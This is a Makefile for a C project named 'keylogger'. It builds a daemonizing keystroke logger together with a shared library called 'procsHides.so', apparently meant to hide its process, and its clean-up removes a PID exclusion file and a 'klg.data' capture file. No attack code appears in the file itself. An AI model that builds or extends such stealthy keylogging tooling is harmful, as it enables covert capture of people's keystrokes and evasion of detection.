#Makefile objectif: clean and perfect
.PHONY: all clean fclean re

# Name of file
NAME		=	keylogger

# Name of libs
LIB_HIDE	=	procsHides.so
# Name directory
PATH_INC	=	includes
PATH_SRC	=	srcs
PATH_OBJ	=	objs
PATH_LOG	=	logs
PATH_LIBH	=	lib/hideprocess
PATH_LIBFT	=	lib/libft

# List of sources
SRCS		=	$(addprefix $(PATH_SRC)/, keylogger.c keymap.c utils.c mod.c daemonize.c signals.c)
OBJS		=	$(addprefix $(PATH_OBJ)/, $(notdir $(SRCS:.c=.o)))

INCS		=	$(addprefix $(PATH_INC)/, $(shell ls $(PATH_INC)))

LOG			=	$(PATH_LOG)/$(NAME).log
LIBFT		=	-L$(PATH_LIBFT) -lft 
#DIRS_LIST	=	$(shell ls -R srcs 2> /dev/null | grep / | cut -d / -f2-3 | cut -d : -f 1)

# Commands of compilation
COMP		=	clang
COMP_FLAG	=	-Wall -Werror -Wextra
COMP_DEB	=	-g3 -fsanitize=address
COMP_ADD	=	-I$(PATH_INC) -I$(PATH_LIBFT)/$(PATH_INC)
# Others Command
RM			=	/bin/rm

# Color Code and template code
_YELLOW		=	\033[38;5;184m
_GREEN		=	\033[38;5;46m
_RESET		=	\033[0m
_INFO		=	[$(_YELLOW)INFO$(_RESET)]
_SUCCESS	=	[$(_GREEN)SUCCESS$(_RESET)]

# Functions
all:	init $(NAME)
	@ echo "$(_SUCCESS) Compilation done"
	@ $(warning    Test)
	@ $(info    $(_SUCCESS)Test2$(LOG))

init:
	@ $(shell mkdir -p $(PATH_OBJ) $(PATH_LOG))
	@ make -C $(PATH_LIBH)
	@ make -C $(PATH_LIBFT)

$(NAME): $(OBJS) $(INCS)
	@ (set -x; $(COMP) $(COMP_FLAG) $(COMP_ADD) -o $(NAME) $(OBJS) $(LIBFT)) >> $(LOG) 2>&1

debug: $(OBJS) $(INCS)
	@ (set -x; $(COMP) $(COMP_FLAG) $(COMP_DEB) $(COMP_ADD) $(INCS) -o minishell_debug $(OBJS) ) >> $(LOG) 2>&1

$(PATH_OBJ)/%.o : $(PATH_SRC)/*/%.c  $(INCS)
	@ (set -x; $(COMP) $(COMP_FLAG) $(COMP_ADD) $(INCS) -c $< -o $@ ) >> $(LOG) 2>&1
	@ echo "$(_INFO) Compilation of $*"

$(PATH_OBJ)/%.o : $(PATH_SRC)/%.c  $(INCS)
	@ (set -x; $(COMP) $(COMP_FLAG) $(COMP_ADD) -c $< -o $@) >> $(LOG) 2>&1
	@ echo "$(_INFO) Compilation of $*"

clean:
	@ $(RM) -rf $(PATH_OBJ)
	@ make -C $(PATH_LIBH) clean
	@ make -C $(PATH_LIBFT) clean
	@ echo "$(_INFO) Some files and directories deleted"


fclean: clean
	@ $(RM) -rf $(NAME)
	@ $(RM) -rf $(PATH_LOG)
	@ $(RM) -rf "/var/cache/pid_to_exclude"
	@ $(RM) -rf "klg.data"
	@ make -C $(PATH_LIBH)	fclean
	@ make -C $(PATH_LIBFT) fclean
	@ echo "$(_INFO) All files and directories deleted"
	$(info    MAKE $(_INFO) RE is )



re: fclean all
